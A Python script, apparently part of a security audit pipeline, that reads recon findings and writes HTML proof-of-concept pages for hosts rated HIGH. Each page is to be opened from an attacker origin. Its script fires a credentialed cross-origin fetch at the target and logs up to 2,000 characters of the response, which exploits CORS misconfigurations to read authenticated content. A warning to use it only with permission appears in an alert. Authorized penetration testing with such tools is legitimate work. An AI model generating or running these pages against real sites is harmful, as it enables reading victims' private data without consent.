#!/usr/bin/env python3
# scripts/generate_pocs.py
"""
Create simple HTML PoC files for HIGH-priority hosts.
"""
import csv, json
from pathlib import Path
BASE_DIR = Path(__file__).resolve().parent.parent
OUT = BASE_DIR / "out"
POC_DIR = BASE_DIR / "pocs"
POC_DIR.mkdir(parents=True, exist_ok=True)

decision_csv = OUT / "decision.csv"
findings_json = OUT / "findings.json"
if not decision_csv.exists() or not findings_json.exists():
    raise SystemExit("[!] run scripts/recon_probe.py and scripts/audit_finalize.py first")

decisions = []
with open(decision_csv, newline='', encoding='utf-8') as f:
    for row in csv.DictReader(f):
        decisions.append(row)

fj = json.loads(findings_json.read_text(encoding='utf-8'))
fj_map = {e["host"]: e for e in fj}

for d in decisions:
    if d["verdict"] != "HIGH":
        continue
    host = d["host"]
    item = fj_map.get(host, {})
    flags = item.get("flags", [])
    if flags:
        path, flag = flags[0]
    else:
        path, flag = "/", "flag_unknown"
    url = f"https://{host}{path}"
    idx = host.replace(".", "_")
    html_content = f"""<!doctype html>
<html>
<head><meta charset="utf-8"><title>PoC {host}</title></head>
<body>
  <h2>PoC for {host}</h2>
  <p>Flagged: {flag}</p>
  <p>Target: {url}</p>
  <p>Open this page from attacker origin. Open developer console to see output.</p>
  <script>
    (function(){{
      console.log("Running PoC to {url}");
      fetch("{url}", {{method: "GET", credentials: "include", mode: "cors"}})
        .then(r => r.text())
        .then(t => {{
           console.log("LENGTH:", t.length);
           console.log("SAMPLE:", t.slice(0,2000));
           alert("PoC done — check console for output. Only use with permission.");
        }}).catch(e => {{
           console.error("ERR", e);
           alert("Fetch error: " + e);
        }});
    }})();
  </script>
</body>
</html>
"""
    (POC_DIR / f"poc_{idx}.html").write_text(html_content, encoding="utf-8")

print(f"[+] Wrote PoC HTML to {POC_DIR}")
